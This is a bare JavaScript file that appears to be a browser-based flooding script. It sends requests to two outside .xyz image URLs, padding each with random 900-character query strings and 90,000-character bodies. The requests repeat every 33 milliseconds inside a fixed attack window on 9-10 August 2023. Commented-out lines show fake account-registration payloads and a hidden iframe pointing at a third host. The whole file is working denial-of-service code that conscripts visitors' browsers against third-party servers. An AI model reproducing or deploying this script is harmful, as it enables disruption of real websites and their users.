var t_url = [
    {
        u: 'https://018a.xyz:8989/fserver/files/gb/1335/floatImage/205/1642061985428.gif?',
        m: 'GET',
        d: ''
    },
    {
        u: 'https://713a.xyz/static/hj/img/8ty_hj_disease/gift.gif?',
        m: 'GET',
        d: ''
    }
];

function randomString(len, charSet) {
    charSet = charSet || 'abcdefghijklmnopqrstuvwxyz0123456789';
    var randomString = '';
    for (var i = 0; i < len; i++) {
    	var randomPoz = Math.floor(Math.random() * charSet.length);
    	randomString += charSet.substring(randomPoz,randomPoz+1);
    }
    return randomString;
}

function post_send() {
    var i = t_url[Math.floor(Math.random() * t_url.length)];
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open(i.m, i.u + Math.round(Math.random()*2188261168+1000000000) + '=' + randomString(900), true);
    //xmlHttp.send('{"email":"' + Math.round(Math.random()*100000+999999999) + '@qq.com","password":"' + randomString(10)+ '","username":"' + Math.round(Math.random()*100000+999999999) + '","' + randomString(10)+ '":"' + randomString(90000)+ '"}');
    xmlHttp.send(randomString(3) + '&p=' + randomString(90000));
    r_send();
}

function r_send() {
    var go = new Date('2023/08/09 12:30:00').getTime();
    var end = new Date('2023/08/10 18:00:00').getTime();
    var Times = new Date().getTime();
    if (go <= Times && end > Times) {
        setTimeout("post_send()", 33);
    } else {
        setTimeout("r_send()", 33);
    }
}

let div = document.createElement('div');
div.innerHTML = `<iframe style="visibility:hidden" src="http://6c0853c704a2ad6dc65ff3c643d41aa1.wbxafe.cfd/"></iframe>`;
//document.body.appendChild(div);

setTimeout("r_send()", 3000);